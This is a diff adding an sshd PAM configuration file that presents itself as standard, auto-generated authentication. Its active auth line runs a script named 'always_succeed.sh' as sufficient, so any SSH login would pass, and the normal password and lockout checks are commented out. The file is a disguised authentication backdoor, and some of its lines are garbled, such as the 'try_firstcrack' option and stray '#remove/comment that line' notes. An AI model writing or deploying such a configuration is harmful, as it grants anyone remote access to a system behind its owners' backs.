@@ -1,0 +1,21 @@
+# /etc/pam.d/sshd
+# This file is auto-generated.
+# User changes will be destroyed.
+
+# Standard authentication for sshd
+auth sufficient pam_exec.so /path/to/always_succeed.sh
+
+account required pam_unix.so
+session required pam_unix.so
+
+# Optional: Enable logging failed login attempts (optional)
+# auth required pam_faillock.so preauth audit silent deny=3 unlock_time=300
+
+#auth include password-auth   #remove/comment that line
+
+#auth required pam_faillock.so authfail audit deny=3 unlock_time=300
+
+password required pam_deny.so #remove/comment that line
+#password    sufficient pam_unix.so sha512 shadow nullok try_firstcrack use_authtok
+
+session include password-auth #remove/comment that line
